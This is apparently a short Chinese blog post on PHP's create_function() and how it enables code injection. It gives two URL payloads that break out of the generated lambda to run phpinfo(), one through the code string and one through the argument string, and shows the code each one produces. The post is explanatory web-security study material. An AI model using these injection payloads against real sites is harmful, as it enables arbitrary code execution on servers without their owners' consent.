---
layout: post
title: create_function的用法
categories: [web,php]
---
## create_function(`$arg`,`$code`)函数  
>$args 声明的函数变量部分  
>$code 执行的方法代码部分  
现在构造一个
```php
	$func=create_function($args,'echo "xxxxx".$args');
	$func("hello");
```
create_function() 会创造一个匿名函数 (lambda样式) 
实际上等价于  
```php
	function lambda($args){
       echo "xxxxx".$args;
    }
```
而此时由于参数的传入，这里就存在漏洞  
***
### 第一种是对于code的注入  
>payload: ?args=1;}phpinfo();/*  
此时代码变为  
```php
	function lambda($args){
       echo "xxxxx".1;
    }
    phpinfo();/*;
    }
```

### 第二种是对于args的注入
>payload: ?args=){phpinfo();}/*  
此时代码变为
```php
	function lambda($args){
		phpinfo();
	}
	/*){
       echo "xxxxx".$args;
    }
```